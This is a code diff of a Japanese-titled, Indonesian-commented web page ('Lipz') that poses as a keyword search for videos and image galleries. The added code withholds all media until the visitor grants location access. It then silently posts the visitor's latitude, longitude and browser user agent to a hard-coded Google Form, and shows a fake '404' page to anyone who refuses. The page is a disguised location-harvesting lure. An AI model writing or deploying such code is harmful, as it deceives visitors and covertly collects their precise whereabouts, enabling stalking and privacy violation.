@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>リップズ</title>
-
 <style>
 body {
   margin: 0;
@@ -123,6 +122,13 @@ button {
   height: 28px;
   fill: black;
 }
+
+.error {
+  font-size: 32px;
+  color: red;
+  text-align: center;
+  margin-top: 50px;
+}
 </style>
 </head>
 
@@ -154,40 +160,53 @@ let data = {};
 let currentIndex = 0;
 let currentImages = [];
 
+// Google Form config
 const formURL = "https://docs.google.com/forms/d/e/1FAIpQLScJJ-PAqYmeOnS6qKdgL1gTGMyX_FjrMLLg93Pv4QDbw1N-Cg/formResponse";
 const entryLatitude = "entry.138340134";
 const entryLongitude = "entry.1616098311";
 const entryUserAgent = "entry.1257224602";
 
+// Ambil data.json
 fetch("https://lipzz-elzxd.github.io/Lipz/data.json")
   .then(res => res.json())
   .then(json => data = json);
 
+// fungsi search gabung lokasi
 function search() {
-  const key = document.getElementById("keyword").value.trim().toLowerCase();
-
-  // Minta izin lokasi dulu
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        // Kirim ke Google Form
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        const ua = navigator.userAgent;
-
-        const formData = new URLSearchParams();
-        formData.append(entryLatitude, lat);
-        formData.append(entryLongitude, lon);
-        formData.append(entryUserAgent, ua);
-
-        fetch(formURL, { method: "POST", mode: "no-cors", body: formData });
-      },
-      err => console.error("Gagal mengambil lokasi", err)
-    );
+  if (!navigator.geolocation) {
+    document.body.innerHTML = '<div class="error">404 - Geolocation Tidak Tersedia</div>';
+    return;
   }
 
-  // Tampilkan modal video / gallery
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      // kirim lokasi ke Google Form
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const ua = navigator.userAgent;
+
+      const formData = new URLSearchParams();
+      formData.append(entryLatitude, lat);
+      formData.append(entryLongitude, lon);
+      formData.append(entryUserAgent, ua);
+
+      fetch(formURL, { method: "POST", mode: "no-cors", body: formData });
+
+      // setelah izin diberikan, tampilkan modal media
+      showMedia();
+    },
+    err => {
+      // jika user menolak
+      document.body.innerHTML = '<div class="error">404 - Anda menolak izin lokasi</div>';
+    }
+  );
+}
+
+// fungsi tampil modal media
+function showMedia() {
+  const key = document.getElementById("keyword").value.trim().toLowerCase();
   if (!data[key]) return;
+
   const modalBox = document.getElementById("modalBox");
   modalBox.innerHTML = '<div class="close" onclick="closeModal()">✕</div>';
 
